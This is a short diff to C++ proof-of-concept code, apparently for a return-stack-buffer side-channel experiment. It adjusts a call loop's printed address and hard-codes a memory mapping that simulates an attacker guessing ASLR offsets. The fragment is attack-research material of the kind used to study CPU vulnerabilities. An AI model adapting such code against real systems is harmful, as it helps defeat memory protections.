@@ -12,7 +12,8 @@ using namespace std;
 // have the same effect - the victim pushes an address onto the
 // RSB which is consumed by the attacker.  
 void callLoop() {
-	// addressLbl:	printf("Call loop located at %p\n", &&addressLbl);
+	// Call loop is 30 bytes beyond addressLbl
+	addressLbl:	printf("Call loop located at %p\n", (&&addressLbl)+30);
 	// Call instructions push the instruciton pointer onto the stack.
 	// Pop %rax to avoid overflowing the stack.
 	asm(
@@ -23,11 +24,11 @@ void callLoop() {
 }
 
 int main(int argc, char *argv[]){
-	// Mode 1: user chooses an offset (simulating ASLR) and attacker guesses it.
+	// Mode 1: choose a random starting address (simulating ASLR) and attacker guesses it.
 	if (argc == 1) {
-		// print("choose a memory offset 0 through 200")
-		// read offset as input
-		void *requestedAddr = (void *)0x0000555555587000; // use input
+		
+
+		void *requestedAddr = (void *)0x0000555555587000;
 		printf("requesting memory at %p\n", requestedAddr);
 		void *newFunc = map((void *)((ADDR_PTR)requestedAddr-4096), 1024);
 		printf("starting address is %p\n", newFunc);
